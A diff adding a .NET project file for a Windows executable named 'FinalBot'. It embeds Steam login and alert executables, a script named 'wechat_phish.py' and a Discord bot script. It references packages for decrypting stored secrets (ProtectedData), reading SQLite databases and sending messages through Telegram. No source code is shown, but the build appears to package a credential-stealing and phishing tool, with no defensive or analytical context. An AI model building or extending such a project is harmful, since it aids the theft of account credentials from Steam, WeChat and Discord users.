@@ -1,0 +1,35 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net8.0-windows</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+    <PublishAot>false</PublishAot>
+    <PublishSingleFile>true</PublishSingleFile>
+    <SelfContained>true</SelfContained>
+    <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
+    <UseWindowsForms>true</UseWindowsForms>
+    <InvariantGlobalization>true</InvariantGlobalization>
+    <AssemblyName>FinalBot</AssemblyName>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <OptimizationPreference>Size</OptimizationPreference>
+  </PropertyGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="SteamAlert.exe" />
+    <EmbeddedResource Include="SteamLogin.exe" />
+    <EmbeddedResource Include="core\wechat_phish.py" />
+    <EmbeddedResource Include="websocket\discord_bot.py" />
+  </ItemGroup>
+  <ItemGroup>
+    <!-- Dependencies -->
+    <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.0" />
+    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
+    <PackageReference Include="System.Management" Version="8.0.0" />
+    <PackageReference Include="System.Drawing.Common" Version="8.0.0" />
+    <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
+    <PackageReference Include="Telegram.Bot" Version="19.0.0" />
+  </ItemGroup>
+
+</Project>
